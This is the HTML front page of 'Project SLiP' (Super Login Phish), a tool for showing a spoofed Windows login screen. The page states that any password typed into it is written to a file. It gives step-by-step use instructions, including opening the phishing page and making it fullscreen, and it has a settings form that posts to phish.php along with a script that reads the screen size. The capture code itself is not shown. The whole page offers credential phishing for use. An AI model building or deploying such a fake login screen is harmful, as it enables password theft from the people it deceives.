<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>Project SLiP</title>
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	
</head>
<body>
<p>
<H1>Project SLiP</H1>
<H2><u>S</u>uper <u>L</u>og<u>i</u>n <u>P</u>hish</H2>
With help of this site you can spoof a very default windows login screen. (Close enough for DAUs, i hope)</br>
The typed in password will be written in a file as of now. </br>
In the future i want to add a few small features like choosing different backgrounds, supporting more resolutions, </br>
different languages and simulating the few seconds of waiting after entering your password with a loading animation.</br></br>

<H2>How to use:</H2>
You have to open this page (index) and set your settings. Then you have to open the phishing page with the button.</br>
The newly opened page is a javascript-called window and can close itself after entering the "password" (Due to some javascript restrictions).</br>
Now close the first page and make the phishing page fullscreen. Have fun!

<H2>Settings</H2>

<form action="phish.php" target="_blank" method="GET">
Name to display as Windows user: <input type="text" name="displayname"></br>
Resolution Width:  <input type="text" id="rewidth" name="rewidth"> Does nothing</br>
Resolution Height: <input type="text" id="reheight" name="reheight"> Also nothing</br>

<script>
		var screenheight = window.screen.height;
		var screenwidth = window.screen.width;
		document.getElementById("rewidth").value = screenwidth;
		document.getElementById("reheight").value = screenheight;
</script>

</p>


<button>Try it</button>

<!-- <script>
function myFunction() {
  window.open("phish.php");
}
</script>
-->

</body>
</html>